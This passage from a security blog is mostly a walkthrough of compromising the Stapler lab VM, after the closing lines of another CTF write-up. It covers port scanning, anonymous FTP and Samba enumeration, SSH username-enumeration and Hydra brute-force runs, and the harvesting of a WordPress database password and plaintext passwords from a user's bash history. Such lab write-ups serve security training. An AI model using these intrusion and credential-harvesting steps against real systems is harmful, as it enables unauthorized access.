&ldquo;  xerubus (@xerubus) &ndash; www.mogozobo.com  &rdquo;
&ldquo;=========================================&rdquo;
```</p>

<p>Flag #11: <strong>hackergod</strong></p>

<p>The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!</p>

<p>Some special fortune cookie:</p>

<p>```</p>

<hr />

<p>/ M: Last I knew, I thought I had trapped \
| you for all eternity in an icy little   |
| place called Cania                      |
|                                         |
| H: Sorry, Hell froze over.              |
|                                         |
| M: How very witty. But it takes more    |
| than sharp wit to rule Hell, little     |
\ one. You must also&hellip;dress the part.    /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got a Stapler?]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/26/got-a-stapler/"/>
    <updated>2018-05-26T17:24:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/26/got-a-stapler</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is a VM made by g0tmi1k for BsidesLondon 2016. So this should be a fun one! From the description:</p>

<p><code>
| + There are multiple methods to-do this machine         |
|   + At least two (2) paths to get a limited shell       |
|   + At least three (3) ways to get a root access        |
</code></p>

<!-- more -->


<p><code>``
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.217.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&amp;M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: SupportsCompression, LongPassword, LongColumnFlag, ODBCClient, Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: *o\x069%}F\x0B\x1B+'\x14l\x19PET8\x15J
|_  Auth Plugin Name: 88
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.70%I=7%D=5/27%Time=5B0A6560%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;</code>\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4+j\xce[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85<code>\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf</code>a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u([r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y<em>\?n2\xff\xf5\xd7\xdf\x86^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\&ldquo;.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac]</em>\xf9\x
SF:cc[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae.L\xf2\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e<code>wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89</code>\xa9\xe4k\xc4S\x0e\xd6P0&rdquo;);
MAC Address: 00:0C:29:2B:76:7B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 &ndash; 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
|<em>clock-skew: mean: 2h37m22s, deviation: 34m37s, median: 2h57m21s
|</em>nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|<em>  System time: 2018-05-27T11:57:06+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|</em>  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|<em>    Message signing enabled but not required
| smb2-time:
|   date: 2018-05-27 06:57:06
|</em>  start_date: N/A</p>

<p>```</p>

<p>Many services, so multiple entry points..hopefully. I decided to check each of them.</p>

<h2>FTP server</h2>

<p>In the port scan results we saw how the FTP server allows anonymous logins. I wanted to find out more about it and used the Metasploit auxiliary FTP scanner:</p>

<p>```
msf auxiliary(scanner/ftp/ftp_version) > run</p>

<p>[+] 192.168.217.141:21    &ndash; FTP Banner: &lsquo;220-\x0d\x0a220-|&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;|\x0d\x0a220-| Harry, make sure to update the banner when you get a chance to show who has access here |\x0d\x0a220-|&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;|\x0d\x0a220-\x0d\x0a220 \x0d\x0a&rsquo;
[<em>] Scanned 1 of 1 hosts (100% complete)
[</em>] Auxiliary module execution completed
```</p>

<p>Now we know a possible username. Next I logged in anonymously to the server and found a note, which I downloaded:</p>

<p><code>
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp&gt; get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.05 secs (1.9866 kB/s)
</code></p>

<p>The note reveals more names that might come in handy later:</p>

<p><code>
cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
</code></p>

<p>Before moving on, I made a list of the usernames that were found so far + root:</p>

<p><code>
root@kali:~# cat users
harry
elly
john
root
</code></p>

<h2>OpenSSH 7.2p2</h2>

<p>With the usernames I found, I tried the <a href="https://www.exploit-db.com/exploits/40136/">OpenSSH 7.2p2 &ndash; Username Enumeration exploit</a>, but with no success:</p>

<p>```
python 40136.py -U users 192.168.217.141</p>

<p>User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>

<p>[<em>] Testing SSHD at: 192.168.217.141:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
[</em>] Getting baseline timing for authenticating non-existing users&hellip;&hellip;&hellip;&hellip;
[<em>] Baseline mean for host 192.168.217.141 is 0.0489913 seconds.
[</em>] Baseline variation for host 192.168.217.141 is 0.0210717273238 seconds.
[<em>] Defining timing of x &lt; 0.112206481972 as non-existing user.
[</em>] Testing your users&hellip;
[&ndash;] harry &ndash; timing: 0.075312
[&ndash;] elly &ndash; timing: 0.06393
[&ndash;] john &ndash; timing: 0.050554
[&ndash;] root &ndash; timing: 0.084294
```</p>

<p>I decided to move on and come back if I get more usernames or fail to get in with other methods.</p>

<h2>dnsmasq</h2>

<p>After some research, I found that dnsmasq 2.75 is prone to multiple DoS vulnerabilities:</p>

<p><a href="https://www.cvedetails.com/cve/CVE-2015-8899/">https://www.cvedetails.com/cve/CVE-2015-8899/</a></p>

<p><a href="https://www.exploit-db.com/exploits/42942/">https://www.exploit-db.com/exploits/42942/</a></p>

<p>We don&rsquo;t want to crash the machine, but we could if we wanted to :)</p>

<h2>Web server on port 80</h2>

<p>The webpage seems empty, with only a Not Found message that states &ldquo;The requested resource / was not found on this server.&rdquo;</p>

<p>I ran Nikto with no big discoveries:</p>

<p>```
nikto -h <a href="http://192.168.217.141/">http://192.168.217.141/</a></p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.217.141</li>
<li>Target Hostname:    192.168.217.141</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2018-06-01 04:44:48 (GMT-4)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: No banner retrieved</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.</li>
<li>OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.</li>
<li>ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response</li>
<li>Scan terminated:  20 error(s) and 5 item(s) reported on remote host

<ul>
<li>End Time:           2018-06-01 04:45:10 (GMT-4) (22 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>Downloaded the .bashrc and .profile files, but there was nothing useful in there.</p>

<h2>Doom</h2>

<p>Here I couldn&rsquo;t find much, the data returned when connecting to it is gibberish. I&rsquo;ve read online about how this could be used for the original Doom game. But there was something that caught my eye when Nmap attempted to fingerprint this:</p>

<p><code>
message2.jpgUT
</code></p>

<p>Maybe I can redirect this to a file and get an image.</p>

<p><code>
nc -vn 192.168.217.141 666 &gt; something
(UNKNOWN) [192.168.217.141] 666 (?) open
root@kali:~# file something
something: Zip archive data, at least v2.0 to extract
</code></p>

<p>Nice, an archive! Inside there was the image from earlier:</p>

<p><code>
unzip something
Archive:  something
  inflating: message2.jpg      
</code></p>

<p><img class="center" src="/images/pentest/stapler/message2.jpg" title="&lsquo;message&rsquo; &lsquo;message&rsquo;" ></p>

<p>This is it? Maybe there&rsquo;s something more..I ran strings on it to get another message:</p>

<p><code>
1If you are reading this, you should get a cookie!
</code></p>

<p>At least it&rsquo;s something..</p>

<h2>MySQL</h2>

<p>Nothing significant here, but something must be using this database.</p>

<h1>Shell #1 &ndash; Samba</h1>

<p>I used enum4linux for Samba enumeration, but only showing what I found most interesting below:</p>

<p>```</p>

<h1>enum4linux -a 192.168.217.141</h1>

<p>|    Share Enumeration on 192.168.217.141    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
kathy           Disk      Fred, What are we doing here?
tmp             Disk      All temporary files should be stored here
IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
</code></pre>

<p>Reconnecting with SMB1 for workgroup listing.</p>

<pre><code>Server               Comment
---------            -------

Workgroup            Master
---------            -------
WORKGROUP            RED
</code></pre>

<p>[+] Attempting to map shares on 192.168.217.141
//192.168.217.141/print$    Mapping: DENIED, Listing: N/A
//192.168.217.141/kathy Mapping: OK, Listing: OK
//192.168.217.141/tmp   Mapping: OK, Listing: OK
//192.168.217.141/IPC$  [E] Can&rsquo;t understand response:
WARNING: The &ldquo;syslog&rdquo; option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing *</p>

<p>==========================================================================
|    Users on 192.168.217.141 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==========================================================================
+] Enumerating users using SID S-1-22-1 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```</p>

<p>That&rsquo;s a ton of users! I&rsquo;ve proceeded to look at the shares with the guest/guest combination:</p>

<p>```
smbclient //192.168.217.141/kathy -U guest
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Enter WORKGROUP\guest&rsquo;s password:
Try &ldquo;help&rdquo; to get a list of possible commands.
smb: > ls
  .                                   D        0  Fri Jun  3 12:52:52 2016
  ..                                  D        0  Mon Jun  6 17:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
  backup                              D        0  Sun Jun  5 11:04:14 2016</p>

<pre><code>    19478204 blocks of size 1024. 16396296 blocks available
</code></pre>

<p>```</p>

<p>I&rsquo;ve looked on the net how to download entire folders and then did just that:</p>

<p><code>
smb: \&gt; tarmode
tar:316  tarmode is now full, system, hidden, noreset, quiet
smb: \&gt; recurse
smb: \&gt; prompt
smb: \&gt; mget kathy_stuff\
NT_STATUS_OBJECT_NAME_INVALID listing \kathy_stuff\
smb: \&gt; mget kathy_stuff
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \&gt; backup
smb: \&gt; mget backup
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (176.4 KiloBytes/sec) (average 43.9 KiloBytes/sec)
getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (14224.9 KiloBytes/sec) (average 10879.4 KiloBytes/sec)
</code></p>

<p>The sequence of commands for downloading folders with smbclient and their description is below:</p>

<p>```
smb: > ? tarmode
HELP tarmode:</p>

<pre><code>&lt;full|inc|reset|noreset&gt; tar's behaviour towards archive bits
</code></pre>

<p>smb: > ? recurse
HELP recurse:</p>

<pre><code>toggle directory recursion for mget and mput
</code></pre>

<p>smb: > ? prompt
HELP prompt:</p>

<pre><code>toggle prompting for filenames for mget and mput
</code></pre>

<p>smb: > ? mget
HELP mget:</p>

<pre><code>&lt;mask&gt; get all the matching files
</code></pre>

<p>```</p>

<p>Next I looked at the tmp share but it was empty. So it&rsquo;s time to see what we&rsquo;ve got:</p>

<p><code>
root@kali:~/kathy_stuff# ls
todo-list.txt
root@kali:~/kathy_stuff# cat todo-list.txt
I'm making sure to backup anything important for Initech, Kathy
</code></p>

<p>Well then, something interesting has to be inside the backup folder:</p>

<p><code>
root@kali:~/backup# ls
vsftpd.conf  wordpress-4.tar.gz
</code></p>

<p>The config file for vsftpd and a Wordpress backup! I tried grep'ing for passwords and looked over the config file, but nothing overly obvious, so again I left these for later in case nothing else works out. For now, I thought about trying my luck again on SSH with the new users. First I put the output from the Samba enumeration in a file and then I selected only the username part and put it in the users file:</p>

<p><code>
cat userlist | cut -d'\' -f2 | cut -d' ' -f1 &gt; users
cat users
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
</code></p>

<p>There has to be a reason for the ease of enumerating all these users, so I used the file to bruteforce the SSH login, to have something going while working on other services. I used Hydra with the <em>nsr</em> flag for additional checks of &ldquo;n&rdquo; for null password, &ldquo;s&rdquo; try login as pass, &ldquo;r&rdquo; try the reverse login as pass. And I got something super fast!</p>

<p>```
hydra -L users -e nsr 192.168.217.141 ssh
Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2018-06-02 07:49:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort&hellip; (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
[DATA] attacking ssh://192.168.217.141:22/
[22][ssh] host: 192.168.217.141   login: SHayslett   password: SHayslett
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2018-06-02 07:50:11
```</p>

<p>Woohoo, a user we can log in with!</p>

<p>```</p>

<h2>ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#83;&#72;&#x61;&#121;&#x73;&#x6c;&#101;&#116;&#x74;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#x31;&#55;&#x2e;&#x31;&#52;&#49;">&#83;&#72;&#97;&#x79;&#115;&#108;&#x65;&#116;&#x74;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#x31;&#x34;&#x31;</a></h2>

<h2>~          Barry, don&rsquo;t forget to put a message here           ~</h2>

<p><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#83;&#72;&#x61;&#121;&#115;&#x6c;&#x65;&#x74;&#116;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#49;&#x37;&#46;&#x31;&#52;&#x31;">&#83;&#72;&#x61;&#121;&#x73;&#108;&#101;&#x74;&#x74;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#x37;&#46;&#49;&#52;&#49;</a>&rsquo;s password:
Welcome back!</p>

<p>SHayslett@red:~$
```</p>

<p>I did some enumeration. In the web directory I found another hidden message:</p>

<p><code>
SHayslett@red:~$ cat /var/www/https/announcements/message.txt
Abby, we need to link the folder somewhere! Hidden at the mo
</code></p>

<p>Inside the /srv folder I noticed a tftp directory, so I checked if TFTP is running, and it was:</p>

<p><code>
netstat -lnp | grep 69
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
unix  2      [ ACC ]     STREAM     LISTENING     16924    -                   /var/run/samba/nmbd/unexpected
</code></p>

<p>I made a note of this and continued looking. In the Wordpress files I found the MySQL credentials inside the <code>wp-config.php</code> file:</p>

<p>```
/<em>* The name of the database for WordPress </em>/
define(&lsquo;DB_NAME&rsquo;, &lsquo;wordpress&rsquo;);</p>

<p>/<em>* MySQL database username </em>/
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>

<p>/<em>* MySQL database password </em>/
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;plbkac&rsquo;);</p>

<p>/<em>* MySQL hostname </em>/
define(&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
```</p>

<p>On this system there are loads of home directories:</p>

<p><code>
ls /home
AParnell  DSwanger    IChadwick  JKanode  LSolum2  NATHAN      SHAY       www
CCeaser   Eeth        jamie      JLipps   MBassin  peter       SHayslett  zoe
CJoo      elly        JBare      kai      mel      RNunemaker  SStroud
Drew      ETollefson  jess       LSolum   MFrei    Sam         Taylor
</code></p>

<p>I was able to list the contents of the home folders and one of them stood out:</p>

<p><code>
ls -alh -R /home
/home/peter:
total 72K
drwxr-xr-x  3 peter peter 4.0K Jun  3  2016 .
drwxr-xr-x 32 root  root  4.0K Jun  4  2016 ..
-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
-rw-r--r--  1 peter peter  220 Jun  3  2016 .bash_logout
-rw-r--r--  1 peter peter 3.7K Jun  3  2016 .bashrc
drwx------  2 peter peter 4.0K Jun  6  2016 .cache
-rw-r--r--  1 peter peter  675 Jun  3  2016 .profile
-rw-r--r--  1 peter peter    0 Jun  3  2016 .sudo_as_admin_successful
-rw-------  1 peter peter  577 Jun  3  2016 .viminfo
-rw-rw-r--  1 peter peter  39K Jun  3  2016 .zcompdump
ls: cannot open directory '/home/peter/.cache': Permission denied
</code></p>

<p>That&rsquo;s interesting, but there&rsquo;s nothing in that file. I&rsquo;ve looked randomly in the <em>.bash_history</em> of some users and saw there were 1-2 lines of irrelevant commands like exit, top. I decided to list all the history files and see if there are discrepancies in their size:</p>

<p><code>
SHayslett@red:~$ ls -alh -R /home | grep '.bash_history'
-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root    16 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root     10 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root      12 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
ls: cannot open directory '/home/peter/.cache': Permission denied
-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
-rw-r--r--  1 root   root      8 Jun  5  2016 .bash_history
-rw-r--r--  1 root root    9 Jun  5  2016 .bash_history
</code></p>

<p>Woot, JKanode&rsquo;s history is 167 bytes long!</p>

<p><code>
SHayslett@red:~$ cat /home/JKanode/.bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
